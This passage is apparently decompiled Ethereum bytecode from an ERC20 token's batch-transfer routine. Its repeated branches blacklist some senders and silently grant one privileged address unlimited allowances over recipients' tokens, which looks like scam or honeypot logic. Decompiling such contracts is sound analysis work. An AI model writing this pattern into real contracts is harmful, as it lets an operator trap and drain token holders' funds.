                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1801), stor12);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1112 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1112] = 38
                            mem[_1112 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1195 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1195 + 68] = mem[idx + _1112 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1195 + 100] = mem[_1195 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1195 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1654 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1654), stor12);
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if 1 == bool(stor2[address(msg.sender)]):
                                if stor11 == msg.sender:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1230 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1230] = 38
                                    mem[_1230 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1344 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[idx + _1344 + 68] = mem[idx + _1230 + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1344 + 100] = mem[_1344 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1344 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1789 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1789), stor12);
                                else:
                                    if stor12 != mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1280 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1280] = 38
                                    mem[_1280 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1409 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[idx + _1409 + 68] = mem[idx + _1280 + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1409 + 100] = mem[_1409 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1409 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1835 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1835), stor12);
                            else:
                                if mem[(32 * idx) + (32 * arg2.length) + 160] >= stor3:
                                    if stor11 == msg.sender:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1278 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1278] = 38
                                        mem[_1278 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1400 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[idx + _1400 + 68] = mem[idx + _1278 + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1400 + 100] = mem[_1400 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1400 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1831 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1831), stor12);
                                    else:
                                        if stor12 != mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1336 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1336] = 38
                                        mem[_1336 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1462 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            s = 0
                                            while s < 38:
                                                mem[s + _1462 + 68] = mem[s + _1336 + 32]
                                                s = s + 32
                                                continue 
                                            mem[_1462 + 100] = mem[_1462 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1462 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1878 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1878), stor12);
                                else:
                                    if stor11 != mem[(32 * idx) + 140 len 20]:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1226 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1226] = 38
                                        mem[_1226 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1338 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[idx + _1338 + 68] = mem[idx + _1226 + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1338 + 100] = mem[_1338 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1338 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1787 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1787), stor12);
                                    else:
                                        mem[0] = msg.sender
                                        stor2[address(msg.sender)] = 1
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1228 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1228] = 38
                                        mem[_1228 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1341 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[idx + _1341 + 68] = mem[idx + _1228 + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1341 + 100] = mem[_1341 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1341 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1788 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1788), stor12);
        idx = idx + 1
        continue 
}



}
